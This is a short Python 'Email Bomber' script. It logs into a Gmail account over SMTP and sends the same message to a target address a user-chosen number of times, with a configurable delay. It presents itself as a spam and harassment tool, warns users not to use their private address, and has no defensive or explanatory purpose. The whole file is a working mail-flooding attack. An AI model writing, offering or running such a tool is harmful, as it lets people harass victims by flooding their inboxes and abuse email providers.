import smtplib #Need this in requirements.txt f
import time
import sys
from colorama import Fore
import stdiomask
#####################################################################
#								    #
#                    Script by iTryZz				    #
#								    #
#####################################################################


print(Fore.YELLOW, """
  ______                 _ _   ____                  _               
 |  ____|               (_| | |  _ \                | |              
 | |__   _ __ ___   __ _ _| | | |_) | ___  _ __ ___ | |__   ___ _ __ 
 |  __| | '_ ` _ \ / _` | | | |  _ < / _ \| '_ ` _ \| '_ \ / _ | '__|
 | |____| | | | | | (_| | | | | |_) | (_) | | | | | | |_) |  __| |   
 |______|_| |_| |_|\__,_|_|_| |____/ \___/|_| |_| |_|_.__/ \___|_|   
                                                                     
                                                                     



""")


print(Fore.WHITE, "I only support a google mail address!")
print(Fore.RED, "This sends all spam emails from this email you input, DO NOT use your private email address for this")

print(Fore.WHITE)
clientEmail = input("Enter your email address: ")
print("==================================================")
if clientEmail.endswith(("@gmail.com")):
	print("[+] Gmail account detected, script can continue...")
	print("==================================================")
else:
	sys.exit("You need a gmail account!")

clientPass = stdiomask.getpass()
msg = input("Your message: ")
targetEmail = input("Enter your target email addresss: ")
EmailAmmount = input("How many emails do you want to send? ")
wait = input("Set the ammount of time to wait before the next email will be sent: ")

smtpServer = "smtp.gmail.com"
smtpPort = "587"

print(f"Sending {EmailAmmount} email(s) to target")

mailServer = smtplib.SMTP(smtpServer, smtpPort)
mailServer.starttls()
mailServer.login(clientEmail, clientPass)

for _ in range(0,int(EmailAmmount)):
	mailServer.sendmail(clientEmail, targetEmail, msg)
	print("[+] Email sent")
	time.sleep(int(wait))

print(Fore.GREEN, f"{EmailAmmount} Emails were successfully sent, cleaning up...")
print(Fore.YELLOW, "[+]Thank you for using this script")
mailServer.quit()
